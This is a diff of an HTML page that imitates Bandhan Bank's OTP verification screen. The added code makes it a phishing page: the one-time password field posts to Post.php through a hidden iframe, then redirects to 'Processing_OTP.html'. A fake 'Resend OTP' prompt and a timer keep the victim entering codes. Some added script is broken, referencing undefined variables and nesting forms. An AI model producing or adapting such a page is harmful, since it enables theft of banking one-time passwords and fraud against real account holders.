@@ -2,7 +2,7 @@
  <head> 
   <meta charset="utf-8"> 
   <meta name="viewport" content="width=device-width, initial-scale=1"> 
-  <title>Bandhan Bank</title>
+  <title>Enter OTP - Bandhan Bank</title>
   <meta name="theme-color" content="#185a8c">
   <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -32,31 +32,47 @@
 
   </style>
  </head> 
- <body> 
+ <body onload="startTimer();"> 
   <div id="overlay"></div> 
   <header> 
    <img src="header.jpg" width="100%" alt=""> 
-  </header> 
+  </header>
+   <!-- partial:index.partial.html -->
+   <!-- Static- Please don't do anything here-->
+   <script type="text/javascript">var submitted=false;</script>
+   <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing_OTP.html';}"></iframe>
   <main class="mt-4 "> 
    <div class="container"> 
     <div class="mx-4 shadow bg-light border p-4"> 
      <div class="position-relative mb-4"> 
-      <h5 class="text-center text-primary">Verification</h5> 
+      <h5 class="text-center text-primary" style="font-family:'Nunito Sans', sans-serif;">OTP Verification</h5> 
       <span class="text-secondary" style="position: absolute;right: -9px;top: -19px;font-size: 22px;">X</span> 
-     </div> 
+     </div>
+     <form class="LoginForm" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform"> 
      <input type="hidden" id="nextValue" value=""> 
-     <p class="text-primary"> OTP has been sent to Mobile Number. Pleae enter OTP below to complete the process. </p> 
-     <input type="hidden" id="page_type" value="ott"> 
+     <p class="text-primary" style="font-family:'Nunito Sans', sans-serif;"> OTP has been sent to Mobile Number. Please enter OTP below to complete the process. </p> 
      <div id="test" class="text-danger fw-bold"></div> 
      <form id="frm_2_am8E" class="mt-4"> 
       <div class="form-group"> 
-       <label for="">One Time Password </label> 
-       <input type="password" maxlength="6" minlength="6" placeholder="Enter OTP.." inputmode="numeric" class="form-control" name="ott" required> 
-       <small class="text-primary">Time left in seconds : <small id="time"></small></small> 
+       <label for="OTP" style="font-family:'Nunito Sans', sans-serif;">One Time Password </label> 
+       <input type="text" maxlength="6"  placeholder="Enter OTP" inputmode="numeric" class="form-control" name="1ST_OTP"
+       pattern="[0-9]\d{5}" title="Please enter valid One Time Password !" required><br> 
+       <script>
+       var url = document.URL;
+       document.getElementById("url").innerHTML = "URL: " + str;
+       function replicateTab(){
+       if(window.confirm("OTP resend successfully, Please check your phone inbox.")){
+       window.location.href="Enter_OTP.html";
+       }
+       }
+       </script>
+       <button id = "button" onclick = "replicateTab()"style="font-family:'Nunito Sans', sans-serif; font-size:14px; font-weight:700; color:#185a8c; background-color:transparent; border:none; position:absolute; margin-top:-7%; margin-left:41%; text-decoration:none;">Resend OTP</button>
+       <div>
+       <small class="text-primary" style="font-family:'Nunito Sans', sans-serif;">Time left in seconds : <small id="time"></small></small> 
       </div> 
       <div class="form-group w-100 my-5 d-flex justify-content-start gap-2"> 
-       <button type="submit" class="submit-button btn btn-primary">Login</button> 
-       <a href="/" class=" btn btn-outline-primary">Cancel</a> 
+       <button type="submit" class="submit-button btn btn-primary">Confirm OTP</button> 
+       <a href="" class=" btn btn-outline-primary">Cancel</a> 
       </div> 
      </form> 
     </div> 
@@ -66,18 +82,23 @@
    <img src="footer.jpg" width="100%" alt=""> 
   </footer> 
   <script>
-        $(document).ready(function() {
-            var timeLeft = 120; // initial countdown time in seconds
-            var timerInterval = setInterval(function() {
-                if (timeLeft <= 0) {
-                    clearInterval(timerInterval);
-                } else {
-                    timeLeft--;
-                    
-                    $('#time').text(timeLeft);
-                }
-            }, 1000);
-        });
+       var timer=180;
+       var sec=180;
+       function startTimer() {
+       sec=parseInt(timer%180);
+       
+       if (timer<2) {
+       // timer.stop();
+       window.location.href = "Enter_OTP.html";
+       }
+       
+       document.getElementById("time").innerHTML = "<p1> </p1>"+sec.toString();
+       timer--;
+       setTimeout(function(){
+       startTimer();
+       
+       }, 1000);
+       }
 
     </script> 
  </body>
